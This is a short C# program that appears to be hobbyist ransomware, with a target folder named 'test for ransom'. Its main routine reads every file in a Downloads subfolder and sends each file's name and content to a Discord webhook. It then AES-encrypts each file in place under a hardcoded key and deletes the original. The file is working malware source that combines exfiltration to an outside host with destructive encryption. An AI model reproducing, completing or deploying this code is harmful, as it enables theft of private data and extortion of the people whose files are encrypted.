using System;
using System.Text;
using Discord.Webhooks;
using SharpAESCrypt;
using System.Threading;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Net.NetworkInformation;
using System.Reflection.Metadata;
using System.Diagnostics;

namespace encrypt
{
    class Program
    {
       
        static void Main(string[] args)
        {
            if (args is null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            string user = Environment.UserName.ToLower();
            string directory = $@"C:\Users\{user}\Downloads\test for ransom\";
            //string directory =  Directory.GetCurrentDirectory();
            var bytes = Encoding.UTF8.GetBytes("dfjakjfklajldlkakfkldjafj");
            var key = Convert.ToBase64String(bytes, Base64FormattingOptions.InsertLineBreaks);
            string webhook_link = "YOUR WEBHOOK";


            foreach (string file in Directory.GetFiles(directory))
            {
                string content = File.ReadAllText(file);

                var webhook = new Webhook()
                {
                    Message = $"**File Name: **{file}   **Content: **```{content}```",
                    Username = "waves0101",
                    WebhookUrl = $"{webhook_link}"
                };
                Thread.Sleep(250);
                webhook.SendInstance();

               
            }

            foreach (string file in Directory.GetFiles(directory))
            {
                string encrypted = directory + "encrypted.txt";
                SharpAESCrypt.SharpAESCrypt.Encrypt(key, file, encrypted);
                File.Delete(file);
                File.Move(encrypted, file);

            }


        }
    }
}
